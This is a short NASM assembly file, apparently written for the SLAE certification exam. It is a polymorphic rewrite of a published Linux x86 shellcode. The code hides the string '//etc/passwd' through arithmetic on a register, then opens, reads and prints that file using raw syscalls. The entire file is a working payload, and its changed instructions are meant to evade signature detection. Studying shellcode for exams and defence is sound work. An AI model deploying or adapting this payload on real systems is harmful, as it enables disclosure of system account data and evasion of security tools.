; Filename: fileRead_poly.nasm
; Author:  Muhereza Herbert
; Website:  http://kilobytesecurity.com
; 
; Orig Source : http://shell-storm.org/shellcode/files/shellcode-842.php
; Orig Size: 51 bytes 
;
; New Size:  bytes
; Purpose: SLAE Exam requirement Assignment Six

global _start			

section .text
_start:

mov esi, 0x74652f2f	;...
xor ecx,ecx		;ecx=0 moved from line 1 to 2...
mul ecx			;eax,edx=0

;push ecx		;push 0x0 
push edx

;push dword 0x64777373
sub esi, 0xfedbbbc	;esi=0x64777373
push dword esi

push dword 0x61702f63

;push dword 0x74652f2f
add esi, 0xfedbbbc	;esi=0x74652f2f
push dword esi

mov ebx,esp
mov al,0x5		;Moved from line3...
int 0x80


xchg eax,ebx
xchg eax,ecx
xor edx,edx

;mov dx,0xfff
mov dx,0xffe
;inc edx
add edx,0x2

mov al,0x3		;Moved from line3 of the secnd syscall...
int 0x80


xchg eax,edx
xor eax,eax

;mov bl,0x1
xor ebx, ebx
inc bl

mov al,0x4		;Moved from line3 of the third syscall...
int 0x80
xchg eax,ebx
int 0x80
